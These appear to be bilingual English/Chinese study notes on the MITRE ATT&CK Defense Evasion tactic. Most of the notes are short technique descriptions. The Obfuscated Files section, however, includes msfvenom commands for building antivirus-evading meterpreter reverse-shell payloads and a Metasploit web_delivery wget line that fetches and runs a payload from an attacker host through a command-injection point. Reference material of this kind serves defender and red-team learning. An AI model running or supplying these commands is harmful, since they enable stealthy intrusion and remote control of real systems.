# TA0005 Defense Evasion
攻击者尝试逃避检测。

## T1548 Abuse Elevation Control Mechanism	滥用提权控制机制

Adversaries may circumvent mechanisms designed to control elevate privileges to gain higher-level permissions. Most modern systems contain native elevation control mechanisms that are intended to limit privileges that a user can perform on a machine. Authorization has to be granted to specific users in order to perform tasks that can be considered of higher risk. An adversary can perform several methods to take advantage of built-in control mechanisms in order to escalate privileges on a system.
### .001	Setuid and Setgid 设置linux用户id 和 组id

An adversary may perform shell escapes or exploit vulnerabilities in an application with the setsuid or setgid bits to get code running in a different user’s context. On Linux or macOS, when the setuid or setgid bits are set for an application, the application will run with the privileges of the owning user or group respectively. . Normally an application is run in the current user’s context, regardless of which user or group owns the application. However, there are instances where programs need to be executed in an elevated context to function properly, but the user running them doesn’t need the elevated privileges.
### .002	Bypass User Account Control	
Adversaries may bypass UAC mechanisms to elevate process privileges on system. Windows User Account Control (UAC) allows a program to elevate its privileges (tracked as integrity levels ranging from low to high) to perform a task under administrator-level permissions, possibly by prompting the user for confirmation. The impact to the user ranges from denying the operation under high enforcement to allowing the user to perform the action if they are in the local administrators group and click through the prompt or allowing them to enter an administrator password to complete the action.
### .003	Sudo and Sudo Caching	
Adversaries may perform sudo caching and/or use the suoders file to elevate privileges. Adversaries may do this to execute commands as other users or spawn processes with higher privileges.
### .004	Elevated Execution with Prompt （欺骗诱使）提示用于输入凭据提升权限
Adversaries may leverage the AuthorizationExecuteWithPrivileges API to escalate privileges by prompting the user for credentials. The purpose of this API is to give application developers an easy way to perform operations with root privileges, such as for application installation or updating. This API does not validate that the program requesting root privileges comes from a reputable source or has been maliciously modified.
## T1134	Access Token Manipulation 访问token操作
Adversaries may modify access tokens to operate under a different user or system security context to perform actions and bypass access controls. Windows uses access tokens to determine the ownership of a running process. A user can manipulate access tokens to make a running process appear as though it is the child of a different process or belongs to someone other than the user that started the process. When this occurs, the process also takes on the security context associated with the new token.
### .001	Token Impersonation/Theft	

Adversaries may duplicate then impersonate another user's token to escalate privileges and bypass access controls. An adversary can create a new access token that duplicates an existing token using DuplicateToken(Ex). The token can then be used with ImpersonateLoggedOnUser to allow the calling thread to impersonate a logged on user's security context, or with SetThreadToken to assign the impersonated token to a thread.
### .002	Create Process with Token	
Adversaries may create a new process with a duplicated token to escalate privileges and bypass access controls. An adversary can duplicate a desired access token with DuplicateToken(Ex) and use it with CreateProcessWithTokenW to create a new process running under the security context of the impersonated user. This is useful for creating a new process under the security context of a different user.
### .003	Make and Impersonate Token 制作或假冒token
Adversaries may make and impersonate tokens to escalate privileges and bypass access controls. If an adversary has a username and password but the user is not logged onto the system, the adversary can then create a logon session for the user using the LogonUser function. The function will return a copy of the new session's access token and the adversary can use SetThreadToken to assign the token to a thread.
### .004	Parent PID Spoofing
Adversaries may spoof the parent process identifier (PPID) of a new process to evade process-monitoring defenses or to elevate privileges. New processes are typically spawned directly from their parent, or calling, process unless explicitly specified. One way of explicitly assigning the PPID of a new process is via the CreateProcess API call, which supports a parameter that defines the PPID to use. This functionality is used by Windows features such as User Account Control (UAC) to correctly set the PPID after a requested elevated process is spawned by SYSTEM (typically via svchost.exe or consent.exe) rather than the current user context.
### .005	SID-History Injection	
Adversaries may use SID-History Injection to escalate privileges and bypass access controls. The Windows security identifier (SID) is a unique value that identifies a user or group account. SIDs are used by Windows security in both security descriptors and access tokens. An account can hold additional SIDs in the SID-History Active Directory attribute , allowing inter-operable account migration between domains (e.g., all values in SID-History are included in access tokens).

## T1197	BITS Jobs	Windows Background Intelligent Transfer Service 作业
Adversaries may abuse BITS jobs to persistently execute or clean up after malicious payloads. Windows Background Intelligent Transfer Service (BITS) 是一种低带宽、异步文件传输机制，可以使用 Component Object Model (COM) 访问。 



BITS is commonly used by updaters, messengers, and other applications preferred to operate in the background (using available idle bandwidth) without interrupting other networked applications. File transfer tasks are implemented as BITS jobs, which contain a queue of one or more file operations.

## T1140	Deobfuscate/Decode Files or Information	反混淆和解码文件或信息
Adversaries may use Obfuscated Files or Information to hide artifacts of an intrusion from analysis. They may require separate mechanisms to decode or deobfuscate that information depending on how they intend to use it. Methods for doing that include built-in functionality of malware or by using utilities present on the system.

## T1006	Direct Volume Access	
Adversaries may directly access a volume to bypass file access controls and file system monitoring. Windows allows programs to have direct access to logical volumes. Programs with direct access may read and write files directly from the drive by analyzing file system data structures. This technique bypasses Windows file access controls as well as file system monitoring tools.

## T1484	Domain Policy Modification	
Adversaries may modify the configuration settings of a domain to evade defenses and/or escalate privileges in domain environments. Domains provide a centralized means of managing how computer resources (ex: computers, user accounts) can act, and interact with each other, on a network. The policy of the domain also includes configuration settings that may apply between domains in a multi-domain/forest environment. Modifications to domain settings may include altering domain Group Policy Objects (GPOs) or changing trust settings for domains, including federation trusts.
## .001	Group Policy Modification	
Adversaries may modify Group Policy Objects (GPOs) to subvert the intended discretionary access controls for a domain, usually with the intention of escalating privileges on the domain. Group policy allows for centralized management of user and computer settings in Active Directory (AD). GPOs are containers for group policy settings made up of files stored within a predicable network path `\<DOMAIN>\SYSVOL\<DOMAIN>\Policies\`.
### .002	Domain Trust Modification	
Adversaries may add new domain trusts or modify the properties of existing domain trusts to evade defenses and/or elevate privileges. Domain trust details, such as whether or not a domain is federated, allow authentication and authorization properties to apply between domains for the purpose of accessing shared resources. These trust objects may include accounts, credentials, and other authentication material applied to servers, tokens, and domains.

## T1480	Execution Guardrails 执行护栏
Adversaries may use execution guardrails to constrain execution or actions based on adversary supplied and environment specific conditions that are expected to be present on the target. Guardrails ensure that a payload only executes against an intended target and reduces collateral damage from an adversary’s campaign. Values an adversary can provide about a target system or environment to use as guardrails may include specific network share names, attached physical devices, files, joined Active Directory (AD) domains, and local/external IP addresses.
### .001	Environmental Keying	
Adversaries may environmentally key payloads or other features of malware to evade defenses and constraint execution to a specific target environment. Environmental keying uses cryptography to constrain execution or actions based on adversary supplied environment specific conditions that are expected to be present on the target. Environmental keying is an implementation of Execution Guardrails that utilizes cryptographic techniques for deriving encryption/decryption keys from specific types of values in a given computing environment.
## T1211	Exploitation for Defense Evasion	
利用漏洞绕过安全检测。
Adversaries may exploit a system or application vulnerability to bypass security features. Exploitation of a software vulnerability occurs when an adversary takes advantage of a programming error in a program, service, or within the operating system software or kernel itself to execute adversary-controlled code. Vulnerabilities may exist in defensive security software that can be used to disable or circumvent them.
## T1222	File and Directory Permissions Modification	修改文件目录权限
Adversaries may modify file or directory permissions/attributes to evade access control lists (ACLs) and access protected files. File and directory permissions are commonly managed by ACLs configured by the file or directory owner, or users with the appropriate permissions. File and directory ACL implementations vary by platform, but generally explicitly designate which users or groups can perform which actions (read, write, execute, etc.).
### .001	Windows File and Directory Permissions Modification	
Adversaries may modify file or directory permissions/attributes to evade access control lists (ACLs) and access protected files. File and directory permissions are commonly managed by ACLs configured by the file or directory owner, or users with the appropriate permissions. File and directory ACL implementations vary by platform, but generally explicitly designate which users or groups can perform which actions (read, write, execute, etc.).
### .002	Linux and Mac File and Directory Permissions Modification	
Adversaries may modify file or directory permissions/attributes to evade access control lists (ACLs) and access protected files. File and directory permissions are commonly managed by ACLs configured by the file or directory owner, or users with the appropriate permissions. File and directory ACL implementations vary by platform, but generally explicitly designate which users or groups can perform which actions (read, write, execute, etc.).
## T1564	Hide Artifacts	隐藏修改痕迹

Adversaries may attempt to hide artifacts associated with their behaviors to evade detection. Operating systems may have features to hide various artifacts, such as important system files and administrative task execution, to avoid disrupting user work environments and prevent users from changing files or features on the system. Adversaries may abuse these features to hide artifacts such as files, directories, user accounts, or other system activity to evade detection.

### .001	Hidden Files and Directories	
Adversaries may set files and directories to be hidden to evade detection mechanisms. To prevent normal users from accidentally changing special files on a system, most operating systems have the concept of a ‘hidden’ file. These files don’t show up when a user browses the file system with a GUI or when using normal commands on the command line. Users must explicitly ask to show the hidden files either via a series of Graphical User Interface (GUI) prompts or with command line switches (dir /a for Windows and ls –a for Linux and macOS).
### .002	Hidden Users	
Adversaries may use hidden users to mask the presence of user accounts they create. Every user account in macOS has a userID associated with it. When creating a user, you can specify the userID for that account.
### .003	Hidden Window	
Adversaries may use hidden windows to conceal malicious activity from the plain sight of users. In some cases, windows that would typically be displayed when an application carries out an operation can be hidden. This may be utilized by system administrators to avoid disrupting user work environments when carrying out administrative tasks.
### .004	NTFS File Attributes	
Adversaries may use NTFS file attributes to hide their malicious data in order to evade detection. Every New Technology File System (NTFS) formatted partition contains a Master File Table (MFT) that maintains a record for every file/directory on the partition. Within MFT entries are file attributes, such as Extended Attributes (EA) and Data [known as Alternate Data Streams (ADSs) when more than one Data attribute is present], that can be used to store arbitrary data (and even complete files).
### .005	Hidden File System
Adversaries may use a hidden file system to conceal malicious activity from users and security tools. File systems provide a structure to store and access data from physical storage. Typically, a user engages with a file system through applications that allow them to access files and directories, which are an abstraction from their physical location (ex: disk sector). Standard file systems include FAT, NTFS, ext4, and APFS. File systems can also contain other structures, such as the Volume Boot Record (VBR) and Master File Table (MFT) in NTFS.
### .006	Run Virtual Instance	
Adversaries may carry out malicious operations using a virtual instance to avoid detection. A wide variety of virtualization technologies exist that allow for the emulation of a computer or computing environment. By running malicious code inside of a virtual instance, adversaries can hide artifacts associated with their behavior from security tools that are unable to monitor activity inside the virtual instance. Additionally, depending on the virtual networking implementation (ex: bridged adapter), network traffic generated by the virtual instance can be difficult to trace back to the compromised host as the IP address and hostname might not match known values.
### .007	VBA Stomping	
Adversaries may hide malicious Visual Basic for Applications (VBA) payloads embedded within MS Office documents by replacing the VBA source code with benign data.

## T1574	Hijack Execution Flow	劫持执行流
Adversaries may execute their own malicious payloads by hijacking the way operating systems run programs. Hijacking execution flow can be for the purposes of persistence, since this hijacked execution may reoccur over time. Adversaries may also use these mechanisms to elevate privileges or evade defenses, such as application control or other restrictions on execution.
### .001	DLL Search Order Hijacking	
Adversaries may execute their own malicious payloads by hijacking the search order used to load DLLs. Windows systems use a common method to look for required DLLs to load into a program. Hijacking DLL loads may be for the purpose of establishing persistence as well as elevating privileges and/or evading restrictions on file execution.
### .002	DLL Side-Loading	
Adversaries may execute their own malicious payloads by hijacking the library manifest used to load DLLs. Adversaries may take advantage of vague references in the library manifest of a program by replacing a legitimate library with a malicious one, causing the operating system to load their malicious library when it is called for by the victim program.
### .004	Dylib Hijacking	
Adversaries may execute their own malicious payloads by hijacking ambiguous paths used to load libraries. Adversaries may plant trojan dynamic libraries, in a directory that will be searched by the operating system before the legitimate library specified by the victim program, so that their malicious library will be loaded into the victim program instead. MacOS and OS X use a common method to look for required dynamic libraries (dylib) to load into a program based on search paths.
### .005	Executable Installer File Permissions Weakness	
Adversaries may execute their own malicious payloads by hijacking the binaries used by an installer. These processes may automatically execute specific binaries as part of their functionality or to perform other actions. If the permissions on the file system directory containing a target binary, or permissions on the binary itself, are improperly set, then the target binary may be overwritten with another binary using user-level permissions and executed by the original process. If the original process and thread are running under a higher permissions level, then the replaced binary will also execute under higher-level permissions, which could include SYSTEM.
### .006	LD_PRELOAD	
Adversaries may execute their own malicious payloads by hijacking the dynamic linker used to load libraries. The dynamic linker is used to load shared library dependencies needed by an executing program. The dynamic linker will typically check provided absolute paths and common directories for these dependencies, but can be overridden by shared objects specified by LD_PRELOAD to be loaded before all others.
### .007	Path Interception by PATH Environment Variable	
Adversaries may execute their own malicious payloads by hijacking environment variables used to load libraries. Adversaries may place a program in an earlier entry in the list of directories stored in the PATH environment variable, which Windows will then execute when it searches sequentially through that PATH listing in search of the binary that was called from a script or the command line.
### .008	Path Interception by Search Order Hijacking	
Adversaries may execute their own malicious payloads by hijacking the search order used to load other programs. Because some programs do not call other programs using the full path, adversaries may place their own file in the directory where the calling program is located, causing the operating system to launch their malicious software at the request of the calling program.
### .009	Path Interception by Unquoted Path	
Adversaries may execute their own malicious payloads by hijacking vulnerable file path references. Adversaries can take advantage of paths that lack surrounding quotations by placing an executable in a higher level directory within the path, so that Windows will choose the adversary's executable to launch.
### .010	Services File Permissions Weakness	
Adversaries may execute their own malicious payloads by hijacking the binaries used by services. Adversaries may use flaws in the permissions of Windows services to replace the binary that is executed upon service start. These service processes may automatically execute specific binaries as part of their functionality or to perform other actions. If the permissions on the file system directory containing a target binary, or permissions on the binary itself are improperly set, then the target binary may be overwritten with another binary using user-level permissions and executed by the original process. If the original process and thread are running under a higher permissions level, then the replaced binary will also execute under higher-level permissions, which could include SYSTEM.
### .011	Services Registry Permissions Weakness	
Adversaries may execute their own malicious payloads by hijacking the Registry entries used by services. Adversaries may use flaws in the permissions for registry to redirect from the originally specified executable to one that they control, in order to launch their own code at Service start. Windows stores local service configuration information in the Registry under HKLM\SYSTEM\CurrentControlSet\Services. The information stored under a service's Registry keys can be manipulated to modify a service's execution parameters through tools such as the service controller, sc.exe, PowerShell, or Reg. Access to Registry keys is controlled through Access Control Lists and permissions.
### .012	COR_PROFILER	
Adversaries may leverage the COR_PROFILER environment variable to hijack the execution flow of programs that load the .NET CLR. The COR_PROFILER is a .NET Framework feature which allows developers to specify an unmanaged (or external of .NET) profiling DLL to be loaded into each .NET process that loads the Common Language Runtime (CLR). These profiliers are designed to monitor, troubleshoot, and debug managed code executed by the .NET CLR.
## T1562	Impair Defenses	
Adversaries may maliciously modify components of a victim environment in order to hinder or disable defensive mechanisms. This not only involves impairing preventative defenses, such as firewalls and anti-virus, but also detection capabilities that defenders can use to audit activity and identify malicious behavior. This may also span both native defenses as well as supplemental capabilities installed by users and administrators.
### .001	Disable or Modify Tools	
Adversaries may disable security tools to avoid possible detection of their tools and activities. This can take the form of killing security software or event logging processes, deleting Registry keys so that tools do not start at run time, or other methods to interfere with security tools scanning or reporting information.
### .002	Disable Windows Event Logging	
Adversaries may disable Windows event logging to limit data that can be leveraged for detections and audits. Windows event logs record user and system activity such as login attempts, process creation, and much more. This data is used by security tools and analysts to generate detections.
### .003	Impair Command History Logging
Adversaries may impair command history logging to hide commands they run on a compromised system. Various command interpreters keep track of the commands users type in their terminal so that users can retrace what they've done.
### .004	Disable or Modify System Firewall	
Adversaries may disable or modify system firewalls in order to bypass controls limiting network usage. Changes could be disabling the entire mechanism as well as adding, deleting, or modifying particular rules. This can be done numerous ways depending on the operating system, including via command-line, editing Windows Registry keys, and Windows Control Panel.
### .006	Indicator Blocking	
An adversary may attempt to block indicators or events typically captured by sensors from being gathered and analyzed. This could include maliciously redirecting or even disabling host-based sensors, such as Event Tracing for Windows (ETW), by tampering settings that control the collection and flow of event telemetry. These settings may be stored on the system in configuration files and/or in the Registry as well as being accessible via administrative utilities such as PowerShell or Windows Management Instrumentation.
### .007	Disable or Modify Cloud Firewall	
Adversaries may disable or modify a firewall within a cloud environment to bypass controls that limit access to cloud resources. Cloud firewalls are separate from system firewalls that are described in Disable or Modify System Firewall.
### .008	Disable Cloud Logs	
An adversary may disable cloud logging capabilities and integrations to limit what data is collected on their activities and avoid detection.

## T1070	Indicator Removal on Host	删除主机上的指标信息
Adversaries may delete or alter generated artifacts on a host system, including logs or captured files such as quarantined malware. Locations and format of logs are platform or product-specific, however standard operating system logs are captured as Windows events or Linux/macOS files such as Bash History and /var/log/*.

### .001	Clear Windows Event Logs	
Adversaries may clear Windows Event Logs to hide the activity of an intrusion. Windows Event Logs are a record of a computer's alerts and notifications. There are three system-defined sources of events: System, Application, and Security, with five event types: Error, Warning, Information, Success Audit, and Failure Audit.
### .002	Clear Linux or Mac System Logs
Adversaries may clear system logs to hide evidence of an intrusion. macOS and Linux both keep track of system or user-initiated actions via system logs. The majority of native system logging is stored under the /var/log/ directory. Subfolders in this directory categorize logs by their related functions, such as:
### .003	Clear Command History	
In addition to clearing system logs, an adversary may clear the command history of a compromised account to conceal the actions undertaken during an intrusion. Various command interpreters keep track of the commands users type in their terminal so that users can retrace what they've done.
### .004	File Deletion	
Adversaries may delete files left behind by the actions of their intrusion activity. Malware, tools, or other non-native files dropped or created on a system by an adversary may leave traces to indicate to what was done within a network and how. Removal of these files can occur during an intrusion, or as part of a post-intrusion process to minimize the adversary's footprint.
### .005	Network Share Connection Removal	
Adversaries may remove share connections that are no longer useful in order to clean up traces of their operation. Windows shared drive and Windows Admin Shares connections can be removed when no longer needed. Net is an example utility that can be used to remove network share connections with the net use \system\share /delete command.
### .006	Timestomp	
Adversaries may modify file time attributes to hide new or changes to existing files. Timestomping is a technique that modifies the timestamps of a file (the modify, access, create, and change times), often to mimic files that are in the same folder. This is done, for example, on files that have been modified or created by the adversary so that they do not appear conspicuous to forensic investigators or file analysis tools.
## T1202	Indirect Command Execution	非直接命令执行
Adversaries may abuse utilities that allow for command execution to bypass security restrictions that limit the use of command-line interpreters. Various Windows utilities may be used to execute commands, possibly without invoking cmd. For example, Forfiles, the Program Compatibility Assistant (pcalua.exe), components of the Windows Subsystem for Linux (WSL), as well as other utilities may invoke the execution of programs and commands from a Command and Scripting Interpreter, Run window, or via scripts.

## T1036	Masquerading	伪装
Adversaries may attempt to manipulate features of their artifacts to make them appear legitimate or benign to users and/or security tools. Masquerading occurs when the name or location of an object, legitimate or malicious, is manipulated or abused for the sake of evading defenses and observation. This may include manipulating file metadata, tricking users into misidentifying the file type, and giving legitimate task or service names.
### .001	Invalid Code Signature	
Adversaries may attempt to mimic features of valid code signatures to increase the chance of deceiving a user, analyst, or tool. Code signing provides a level of authenticity on a binary from the developer and a guarantee that the binary has not been tampered with. Adversaries can copy the metadata and signature information from a signed program, then use it as a template for an unsigned program. Files with invalid code signatures will fail digital signature validation checks, but they may appear more legitimate to users and security tools may improperly handle these files.

### .002	Right-to-Left Override	
Adversaries may use the right-to-left override (RTLO or RLO) character (U+202E) as a means of tricking a user into executing what they think is a benign file type but is actually executable code. RTLO is a non-printing character that causes the text that follows it to be displayed in reverse. For example, a Windows screensaver executable named March 25 \u202Excod.scr will display as March 25 rcs.docx. A JavaScript file named photo_high_re\u202Egnp.js will be displayed as photo_high_resj.png.
### .003	Rename System Utilities	
Adversaries may rename legitimate system utilities to try to evade security mechanisms concerning the usage of those utilities. Security monitoring and control mechanisms may be in place for system utilities adversaries are capable of abusing. It may be possible to bypass those security mechanisms by renaming the utility prior to utilization (ex: rename rundll32.exe). An alternative case occurs when a legitimate utility is copied or moved to a different directory and renamed to avoid detections based on system utilities executing from non-standard paths.
	
Masquerade Task or Service	Adversaries may attempt to manipulate the name of a task or service to make it appear legitimate or benign. Tasks/services executed by the Task Scheduler or systemd will typically be given a name and/or description. Windows services will have a service name as well as a display name. Many benign tasks and services exist that have commonly associated names. Adversaries may give tasks or services names that are similar or identical to those of legitimate ones.
### .005	Match Legitimate Name or Location	
Adversaries may match or approximate the name or location of legitimate files when naming/placing their files. This is done for the sake of evading defenses and observation. This may be done by placing an executable in a commonly trusted directory (ex: under System32) or giving it the name of a legitimate, trusted program (ex: svchost.exe). Alternatively, the filename given may be a close approximation of legitimate programs or something innocuous.
### .006	Space after Filename	
Adversaries can hide a program's true filetype by changing the extension of a file. With certain file types (specifically this does not work with .app extensions), appending a space to the end of a filename will change how the file is processed by the operating system.
## T1556	Modify Authentication Process
Adversaries may modify authentication mechanisms and processes to access user credentials or enable otherwise unwarranted access to accounts. The authentication process is handled by mechanisms, such as the Local Security Authentication Server (LSASS) process and the Security Accounts Manager (SAM) on Windows or pluggable authentication modules (PAM) on Unix-based systems, responsible for gathering, storing, and validating credentials.
### .001	Domain Controller Authentication
Adversaries may patch the authentication process on a domain controller to bypass the typical authentication mechanisms and enable access to accounts.
### .002	Password Filter DLL
Adversaries may register malicious password filter dynamic link libraries (DLLs) into the authentication process to acquire user credentials as they are validated.
### .003	Pluggable Authentication Modules
Adversaries may modify pluggable authentication modules (PAM) to access user credentials or enable otherwise unwarranted access to accounts. PAM is a modular system of configuration files, libraries, and executable files which guide authentication for many services. The most common authentication module is pam_unix.so, which retrieves, sets, and verifies account authentication information in /etc/passwd and /etc/shadow.
### .004	Network Device Authentication
Adversaries may use Patch System Image to hard code a password in the operating system, thus bypassing of native authentication mechanisms for local accounts on network devices.
## T1578	Modify Cloud Compute Infrastructure	
An adversary may attempt to modify a cloud account's compute service infrastructure to evade defenses. A modification to the compute service infrastructure can include the creation, deletion, or modification of one or more components such as compute instances, virtual machines, and snapshots.
### .001	Create Snapshot	
An adversary may create a snapshot or data backup within a cloud account to evade defenses. A snapshot is a point-in-time copy of an existing cloud compute component such as a virtual machine (VM), virtual hard drive, or volume. An adversary may leverage permissions to create a snapshot in order to bypass restrictions that prevent access to existing compute service infrastructure, unlike in Revert Cloud Instance where an adversary may revert to a snapshot to evade detection and remove evidence of their presence.
### .002	Create Cloud Instance	
An adversary may create a new instance or virtual machine (VM) within the compute service of a cloud account to evade defenses. Creating a new instance may allow an adversary to bypass firewall rules and permissions that exist on instances currently residing within an account. An adversary may Create Snapshot of one or more volumes in an account, create a new instance, mount the snapshots, and then apply a less restrictive security policy to collect Data from Local System or for Remote Data Staging.
### .003	Delete Cloud Instance	
An adversary may delete a cloud instance after they have performed malicious activities in an attempt to evade detection and remove evidence of their presence. Deleting an instance or virtual machine can remove valuable forensic artifacts and other evidence of suspicious behavior if the instance is not recoverable.
### .004	Revert Cloud Instance	
An adversary may revert changes made to a cloud instance after they have performed malicious activities in attempt to evade detection and remove evidence of their presence. In highly virtualized environments, such as cloud-based infrastructure, this may be accomplished by restoring virtual machine (VM) or data storage snapshots through the cloud management dashboard or cloud APIs.
## T1112	Modify Registry
Adversaries may interact with the Windows Registry to hide configuration information within Registry keys, remove information as part of cleaning up, or as part of other techniques to aid in persistence and execution.
## T1601	Modify System Image	
Adversaries may make changes to the operating system of embedded network devices to weaken defenses and provide new capabilities for themselves. On such devices, the operating systems are typically monolithic and most of the device functionality and capabilities are contained within a single file.
### .001	Patch System Image
Adversaries may modify the operating system of a network device to introduce new capabilities or weaken existing defenses. Some network devices are built with a monolithic architecture, where the entire operating system and most of the functionality of the device is contained within a single file. Adversaries may change this file in storage, to be loaded in a future boot, or in memory during runtime.
### .002	Downgrade System Image	
Adversaries may install an older version of the operating system of a network device to weaken security. Older operating system versions on network devices often have weaker encryption ciphers and, in general, fewer/less updated defensive features.
## T1599	Network Boundary Bridging
Adversaries may bridge network boundaries by compromising perimeter network devices. Breaching these devices may enable an adversary to bypass restrictions on traffic routing that otherwise separate trusted and untrusted networks.
### .001	Network Address Translation Traversal
Adversaries may bridge network boundaries by modifying a network device’s Network Address Translation (NAT) configuration. Malicious modifications to NAT may enable an adversary to bypass restrictions on traffic routing that otherwise separate trusted and untrusted networks.
## T1027	Obfuscated Files or Information 文件或信息混淆
攻击者可能通过加密、编码或别的混淆方式使其可执行文件或其它文件难以被发现或分析。


### .001	Binary Padding 二进制padding
使用二进制padding方法，在恶意文件种增加垃圾数据或改变文件在磁盘上的表现形式。这种方法可能不影响文件功能，但时会增加二进制文件的大小，有些杀毒软件能够发现这一点。

#### msfvenom 

这个工具可用于生成shellcode，并利用一些msf中的编码器来达到一定的绕过系统（不少已经失效）。
```
Options:
    -l, --list            <type>        # 列出所有可用的项目，其中值可以被设置为 payloads, encoders, nops, platforms, archs, encrypt, formats等等
    -p, --payload         <payload>     # 指定特定的 Payload，如果被设置为 - ，那么从标准输入流中读取
        --list-options                  # 列出--payload <value> 的标准，高级和规避选项
    -f, --format          <format>      # 指定 Payload 的输出格式(使用 --list formats 列出)
    -e, --encoder         <encoder>     # 指定使用的 Encoder (使用 --list encoders 列出)
        --sec-name        <value>       # 生成大型Windows二进制文件时使用的新名称。默认值：随机4个字符的字符串
        --smallest                      # 使用所有可用的编码器生成最小的payload
        --encrypt         <value>       # 应用于shellcode的加密或编码类型 (使用--list encrypt 列出)
        --encrypt-key     <value>       # 用于加密的密钥
        --encrypt-iv      <value>       # 加密的初始化向量
    -a, --arch            <arch>        # 指定目标系统架构(使用 --list archs  列出)
        --platform        <platform>    # 指定目标系统平台 (使用 --list platforms 列出)
    -o, --out             <path>        # 保存payload文件
    -b, --bad-chars       <list>        # 设置需要在 Payload 中避免出现的字符，如： '\x00\xff'
    -n, --nopsled         <length>      # 指定 nop 在 payload 中的数量
    -s, --space           <length>      # 设置未经编码的 Payload 的最大长度
        --encoder-space   <length>      # 编码后的 Payload 的最大长度
    -i, --iterations      <count>       # 设置 Payload 的编码次数
    -c, --add-code        <path>        # 指定包含一个额外的win32 shellcode文件
    -x, --template        <path>        # 指定一个特定的可执行文件作为模板
    -k, --keep                          # 保护模板程序的功能，注入的payload作为一个新的进程运行
    -v, --var-name        <value>       # 指定一个变量名（当添加 -f 参数的时候，例如 -f python，那么输出为 python 代码， payload 会被按行格式化为 python 代码，追加到一个 python 变量中，这个参数即为指定 python 变量的变量名）
    -t, --timeout         <second>      # 设置从STDIN读取payload的等待时间（默认为30,0为禁用）
    -h, --help                          # 帮助
```

命令示例：

```bash
# 不进行编码处理
msfvenom -p windows/meterpreter/reverse_tcp LHOST=YOUR_CC_SERVER_IP LPORT=YOUR_CC_SERVER_PORT  -f exe -o payload.exe

msfvenom --platform linux -a x86 -p linux/x86/meterpreter/reverse_tcp  -f elf -o payload.elf

msfvenom --platform osx -a x86 -p osx/x86/shell_reverse_tcp -f macho -o payload.macho

msfvenom -p android/meterpreter/reverse_tcp -o payload.apk

msfvenom --platform windows-p windows/meterpreter/reverse_tcp  -f aspx -o payload.aspx

msfvenom --platform java -p java/jsp_shell_reverse_tcp  -f raw -o payload.jsp

msfvenom -p php/meterpreter_reverse_tcp -f raw -o payload.php

msfvenom -p cmd/unix/reverse_bash -f raw -o shell.sh

msfvenom -p python/meterpreter/reverse_tcp -f raw -o shell.py



# 进行编码处理 msfvenom -a 系统架构 --platform 系统平台 -p 有效载荷 lhost=攻击机IP lport=攻击机端口 -e 编码方式  -i编码次数 -f 输出格式 -o 输出文件 
# shikata_ga_nai 是非常好用的编码方案，但容易被检测
msfvenom -a x86 --platform windows -p windows/meterpreter/reverse_tcp LHOST=YOUR_CC_SERVER_IP  LPORT=YOUR_CC_SERVER_PORT  -e x86/shikata_ga_nai -i 20 -f exe -o payload.exe

msfvenom -p  windows/meterpreter/reverse_tcp -e x86/shikata_ga_nai -i 10 -b ‘\x00’ lhost=192.168.137.44 lport=4444 -f c -o shell.c
```

由于上述方法编码后的代码并不能很好的绕过杀软等防御技术，攻击者可能会尝试对生成的shellcode 再编码的方式，例如先生成一个含有shellcode 的python脚本，然后利用pyinstaller 、py2exe或其它方法将其再生成exe文件。

又例如将shellcode生成c文件，然后再放入一个c文件中，包装一层。

##### msf web_delivery

msfconsole有一个exploit (multi/script/web_delivery)，提供由web注入载荷的方法。如果web页面有os 命令执行漏洞或其它相关功能，那么可以尝试。

例如：
```
msf>use multi/script/web_delivery
msf>set LHOST CC服务器IP地址
msf>set target 目标系统例如linux或windows
msf>set payload 最好位meterpreter reverse_tcp
msf>run 

# 正常会给出一个命令串，如：
Run the following command on the target machine:
wget -qO 1S7w1axQ --no-check-certificate http://10.10.10.152:8080/XK9DL7hxpeaS6; chmod +x 1S7w1axQ; ./1S7w1axQ& disown

```
在有漏洞的命令注入点键入`wget -qO 1S7w1axQ --no-check-certificate http://10.10.10.152:8080/XK9DL7hxpeaS6; chmod +x 1S7w1axQ; ./1S7w1axQ& disown`，即可获得反弹shell。权限通常不低（视web site或容器的权限）。



### .002	Software Packing 软件加壳（打包）
攻击者通过执行软件加壳或虚拟机软件保护来隐藏代码。软件加壳是一种压缩或加密可执行文件的方法。加壳会改变文件签名，可用于避免基于签名的检查（杀软或IDS、WAF、EDR使用）。有很多种内存解压技术可支持这一点。虚拟机保护技术将一个可执行代码翻译为特殊格式，仅能在某个虚拟机中运行。攻击者预设的虚拟机会在某个时刻调用这些代码。


### .003	Steganography 隐写术
通过隐写，防止对隐藏数据的检查。这个技术主要用于在图片、音频、视频、文本中隐藏数据。

### .004	Compile After Delivery 交付后编译
攻击者将不易发现的payloads交付给受害者，例如文本源代码不常被保护工具所检测。攻击者在执行前，通过本地工具（如csc.exe 或GCC/MING）等编译。

### .005	Indicator Removal from Tools 从工具中删除标志性特征
删除恶意软件中的标志性特征，使用升级版本来躲避检查。


## T1542	Pre-OS Boot
Adversaries may abuse Pre-OS Boot mechanisms as a way to establish persistence on a system. During the booting process of a computer, firmware and various startup services are loaded before the operating system. These programs control flow of execution before the operating system takes control.
### .001	System Firmware
Adversaries may modify system firmware to persist on systems.The BIOS (Basic Input/Output System) and The Unified Extensible Firmware Interface (UEFI) or Extensible Firmware Interface (EFI) are examples of system firmware that operate as the software interface between the operating system and hardware of a computer.
### .002	Component Firmware
Adversaries may modify component firmware to persist on systems. Some adversaries may employ sophisticated means to compromise computer components and install malicious firmware that will execute adversary code outside of the operating system and main system firmware or BIOS. This technique may be similar to System Firmware but conducted upon other system components/devices that may not have the same capability or level of integrity checking.
### .003	Bootkit
Adversaries may use bootkits to persist on systems. Bootkits reside at a layer below the operating system and may make it difficult to perform full remediation unless an organization suspects one was used and can act accordingly.
### .004	ROMMONkit
Adversaries may abuse the ROM Monitor (ROMMON) by loading an unauthorized firmware with adversary code to provide persistent access and manipulate device behavior that is difficult to detect.
### .005	TFTP Boot
Adversaries may abuse netbooting to load an unauthorized network device operating system from a Trivial File Transfer Protocol (TFTP) server. TFTP boot (netbooting) is commonly used by network administrators to load configuration-controlled network device images from a centralized management server. Netbooting is one option in the boot sequence and can be used to centralize, manage, and control device images.
## T1055	Process Injection
Adversaries may inject code into processes in order to evade process-based defenses as well as possibly elevate privileges. Process injection is a method of executing arbitrary code in the address space of a separate live process. Running code in the context of another process may allow access to the process's memory, system/network resources, and possibly elevated privileges. Execution via process injection may also evade detection from security products since the execution is masked under a legitimate process.
### .001	Dynamic-link Library Injection
Adversaries may inject dynamic-link libraries (DLLs) into processes in order to evade process-based defenses as well as possibly elevate privileges. DLL injection is a method of executing arbitrary code in the address space of a separate live process.
### .002	Portable Executable Injection
